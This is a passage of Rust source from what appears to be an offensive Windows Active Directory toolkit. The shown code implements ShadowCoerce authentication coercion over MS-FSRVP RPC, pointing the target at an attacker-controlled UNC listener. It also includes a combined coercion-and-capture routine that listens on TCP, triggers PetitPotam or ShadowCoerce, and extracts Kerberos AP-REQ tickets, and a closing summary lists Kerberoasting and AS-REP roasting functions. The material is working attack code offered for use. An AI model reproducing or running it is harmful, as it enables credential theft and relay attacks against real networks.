                .ok_or_else(|| anyhow!("{} not found in rpcrt4.dll", $name))
                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
            };
        }

        let string_binding_compose: FnRpcStringBindingComposeW =
            resolve_rpc_fn!("RpcStringBindingComposeW", FnRpcStringBindingComposeW);
        let binding_from_string: FnRpcBindingFromStringBindingW = resolve_rpc_fn!(
            "RpcBindingFromStringBindingW",
            FnRpcBindingFromStringBindingW
        );
        let binding_free: FnRpcBindingFree = resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
        let string_free: FnRpcStringFreeW = resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
        let rpc_get_buffer: FnIRpcGetBuffer = resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
        let rpc_send_receive: FnIRpcSendReceive =
            resolve_rpc_fn!("I_RpcSendReceive", FnIRpcSendReceive);
        let rpc_free_buffer: FnIRpcFreeBuffer =
            resolve_rpc_fn!("I_RpcFreeBuffer", FnIRpcFreeBuffer);

        // Build the string binding to the target's FSRVP endpoint.
        let proto_seq_w: Vec<u16> = "ncacn_np\0".encode_utf16().collect();
        let target_w: Vec<u16> = target_host
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let endpoint_w: Vec<u16> = "\\pipe\\srvsvc\0".encode_utf16().collect();

        let mut binding_str: *mut u16 = ptr::null_mut();
        let rpc_status = string_binding_compose(
            ptr::null(),
            proto_seq_w.as_ptr(),
            target_w.as_ptr(),
            endpoint_w.as_ptr(),
            ptr::null(),
            &mut binding_str,
        );

        if rpc_status != 0 {
            bail!(
                "RpcStringBindingComposeW failed: 0x{:08X}",
                rpc_status as u32
            );
        }

        let mut binding_handle: *mut c_void = ptr::null_mut();
        let bind_status = binding_from_string(binding_str, &mut binding_handle);
        string_free(&mut binding_str);

        if bind_status != 0 {
            bail!(
                "RpcBindingFromStringBindingW failed: 0x{:08X}",
                bind_status as u32
            );
        }

        // ShadowCoerce uses the FSRVP IsPathSupported (opnum 10) to trigger
        // the target to authenticate to a UNC path. The target's FSRVP service
        // attempts to validate the path, triggering Kerberos/NTLM auth.
        //
        // FSRVP IsPathSupported (opnum 10):
        //   HRESULT IsPathSupported(
        //     [in, string] wchar_t *SharePath,
        //     [out] long *Supported
        //   );
        //
        // The UNC path points to the attacker's listener.
        let unc_path = format!("\\\\{}\\share", listener_host);
        let unc_w: Vec<u16> = unc_path.encode_utf16().chain(std::iter::once(0)).collect();

        // NDR stub for IsPathSupported:
        //   [in, string] wchar_t *SharePath  — conformant wide string
        //   [out] long *Supported             — NULL on input (pointer, 4 bytes)
        let wstr_bytes = unc_w.len() * 2;
        let stub_size = 12 + wstr_bytes; // conformant string header + chars
        let stub_aligned = (stub_size + 3) & !3; // align to 4
        let total_stub = stub_aligned + 4; // + out pointer

        // Set up the RPC_MESSAGE for IsPathSupported (opnum 10).
        let fsvrp_guid = GUID::from_bytes(&FSRVP_UUID);
        let mut client_if = mem::zeroed::<RpcClientInterface>();
        client_if.length = mem::size_of::<RpcClientInterface>() as u32;
        client_if.interface_uuid = fsvrp_guid;
        client_if.major_version = 1;
        client_if.minor_version = 0;

        let mut msg = RpcMessage {
            handle: binding_handle,
            data_representation: 0x00000010, // little-endian, ASCII, IEEE float
            buffer: ptr::null_mut(),
            buffer_length: total_stub as u32,
            proc_num: 10, // IsPathSupported
            transfer_syntax: ptr::null_mut(),
            rpc_interface_information: &mut client_if as *mut _ as *mut c_void,
            reserved_for_runtime: ptr::null_mut(),
            manager_epv: ptr::null_mut(),
            import_context: ptr::null_mut(),
            rpc_flags: 0,
        };

        // Allocate the RPC stub buffer.
        let buf_status = rpc_get_buffer(&mut msg);
        if buf_status != 0 {
            binding_free(&mut binding_handle);
            bail!(
                "I_RpcGetBuffer failed for ShadowCoerce: 0x{:08X}",
                buf_status as u32
            );
        }

        // Marshal the stub data.
        if msg.buffer.is_null() || msg.buffer_length < total_stub as u32 {
            rpc_free_buffer(&mut msg);
            binding_free(&mut binding_handle);
            bail!("I_RpcGetBuffer returned insufficient buffer for ShadowCoerce");
        }

        let buf_slice = std::slice::from_raw_parts_mut(msg.buffer, total_stub);
        let mut off: usize = 0;

        // [in, string] wchar_t *SharePath — conformant wide string.
        marshal_conformant_wstr(buf_slice, &mut off, &unc_w);

        // [out] long *Supported — NULL pointer on input.
        buf_slice[off..off + 4].copy_from_slice(&0u32.to_le_bytes());

        // Send the RPC request.
        // The target's FSRVP service will attempt to validate the UNC path,
        // triggering Kerberos/NTLM authentication to the listener.
        let send_status = rpc_send_receive(&mut msg);

        if send_status != 0 {
            tracing::debug!(
                "ShadowCoerce: IsPathSupported returned 0x{:08X} (expected — auth coercion occurred)",
                send_status as u32,
            );
        }

        // Free the response buffer.
        rpc_free_buffer(&mut msg);
        binding_free(&mut binding_handle);

        Ok(CoercionResult {
            success: true,
            status: format!(
                "ShadowCoerce coercion completed: target {} attempted auth to {} (RPC status 0x{:08X})",
                target_host, listener_host, send_status as u32
            ),
            method: "ShadowCoerce/FSRVP".to_string(),
            captured_ticket: None,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════
//  Kerberos Relay Listener — Combined Coercion + Capture
// ═══════════════════════════════════════════════════════════════════════

/// Execute a full Kerberos relay attack with coercion.
///
/// 1. Starts a TCP listener to capture authentication.
/// 2. Coerces the target to authenticate to the listener.
/// 3. Captures the Kerberos ticket from the authentication.
/// 4. Returns the captured ticket for relay or analysis.
///
/// # Arguments
///
/// * `target_host` - The machine to coerce.
/// * `listener_bind` - Local address to bind the relay listener.
/// * `listener_port` - Port for the relay listener.
/// * `coercion_method` - "petitpotam" or "shadowcoerce".
/// * `timeout_secs` - How long to wait for the authentication.
pub fn start_kerberos_relay_listener(
    target_host: &str,
    listener_bind: &str,
    listener_port: u16,
    coercion_method: &str,
    timeout_secs: u64,
) -> Result<String> {
    // Start the relay listener in a separate thread.
    let bind_addr = format!("{}:{}", listener_bind, listener_port);
    let listener = TcpListener::bind(&bind_addr)
        .with_context(|| format!("Failed to bind relay listener on {bind_addr}"))?;

    tracing::info!("Kerberos relay listener started on {}", bind_addr);

    // Spawn the coercion in a separate thread.
    let target = target_host.to_string();
    let lhost = listener_bind.to_string();
    let method = coercion_method.to_lowercase();
    let lport = listener_port;

    let coerce_handle = std::thread::spawn(move || match method.as_str() {
        "petitpotam" | "efsrpc" => coerce_auth_via_petitpotam(&target, &lhost, lport),
        "shadowcoerce" | "fsrvp" => coerce_auth_via_shadowcoerce(&target, &lhost, lport),
        _ => Err(anyhow!("Unknown coercion method: {}", method)),
    });

    // Accept a connection and read the authentication data.
    listener
        .set_nonblocking(false)
        .context("Failed to set listener blocking mode")?;

    let stream = listener
        .incoming()
        .next()
        .ok_or_else(|| anyhow!("No incoming connection before timeout"))??;

    stream
        .set_read_timeout(Some(std::time::Duration::from_secs(timeout_secs)))
        .context("Failed to set read timeout")?;

    let peer = stream
        .peer_addr()
        .map(|a| a.to_string())
        .unwrap_or_else(|_| "unknown".to_string());

    tracing::info!("Kerberos relay: connection from {}", peer);

    let mut buf = vec![0u8; 65536];
    let n = std::io::Read::read(&mut &stream, &mut buf)
        .context("Failed to read from relay connection")?;
    buf.truncate(n);

    // Wait for the coercion thread.
    let coercion_result = coerce_handle.join();

    // Analyze the captured data.
    let auth_analysis = if n >= 24 {
        // Try to parse as RPC bind request.
        match parse_rpc_bind_request(&buf) {
            Ok(trailer) => {
                if trailer.auth_type == RPC_C_AUTHN_GSS_KERBERO {
                    // Parse the AP-REQ.
                    match parse_ap_req(&trailer.auth_token) {
                        Ok(ticket) => serde_json::json!({
                            "auth_type": "kerberos",
                            "ticket_captured": true,
                            "ap_req_size": ticket.ap_req_raw.len(),
                            "ticket_blob_size": ticket.ticket_blob.len(),
                            "authenticator_size": ticket.authenticator_blob.len(),
                            "ap_req_hex": hex::encode(&ticket.ap_req_raw),
                            "ticket_hex": hex::encode(&ticket.ticket_blob),
                        }),
                        Err(e) => serde_json::json!({
                            "auth_type": "kerberos",
                            "ticket_captured": false,
                            "parse_error": format!("{e}"),
                            "raw_hex": hex::encode(&trailer.auth_token),
                        }),
                    }
                } else {
                    serde_json::json!({
                        "auth_type": format!("unknown_0x{:02X}", trailer.auth_type),
                        "ticket_captured": false,
                        "raw_hex": hex::encode(&buf),
                    })
                }
            }
            Err(_) => {
                serde_json::json!({
                    "auth_type": "raw",
                    "ticket_captured": false,
                    "data_size": n,
                    "raw_hex": hex::encode(&buf),
                })
            }
        }
    } else {
        serde_json::json!({
            "auth_type": "insufficient_data",
            "data_size": n,
        })
    };

    Ok(serde_json::to_string_pretty(&serde_json::json!({
        "success": true,
        "coercion_method": coercion_method,
        "target": target_host,
        "listener": format!("{}:{}", listener_bind, listener_port),
        "peer": peer,
        "coercion_status": match &coercion_result {
            Ok(Ok(r)) => r.status.clone(),
            Ok(Err(e)) => format!("coercion failed: {e}"),
            Err(_) => "coercion thread panicked".to_string(),
        },
        "captured_auth": auth_analysis,
    }))?)
}

// ═══════════════════════════════════════════════════════════════════════
//  Module Update — Added Features Summary
// ═══════════════════════════════════════════════════════════════════════
//
//  This module now provides:
//
//  1. COM-based Kerberos relay (original):
//     - execute_kerberos_relay() — capture AP-REQ via COM activation
//     - list_clsids_json() — list exploitable CLSIDs
//
//  2. LSA Kerberos ticket operations:
//     - get_tgt_for_current_user() — retrieve TGT via Kerberos SSP
//     - request_service_ticket() — retrieve TGS for a target SPN
//     - list_cached_tickets() — list all cached Kerberos tickets
//
//  3. Kerberoast:
//     - kerberoast_spns() — LDAP SPN enumeration + TGS hash extraction
//     - kerberoast_json() — convenience wrapper returning JSON
//     - extract_rc4_ticket() — parse ticket into crackable hash format
//
//  4. AS-REP Roasting:
//     - asrep_roast() — target specific users for AS-REP hashes
//     - asrep_roast_ldap() — auto-discover DONT_REQ_PREAUTH users
//     - asrep_roast_json() — convenience wrapper returning JSON
//
//  5. Auth Coercion:
//     - coerce_auth_via_petitpotam() — MS-EFSRPC coercion
//     - coerce_auth_via_shadowcoerce() — MS-FSRVP coercion
//     - start_kerberos_relay_listener() — combined coercion + capture
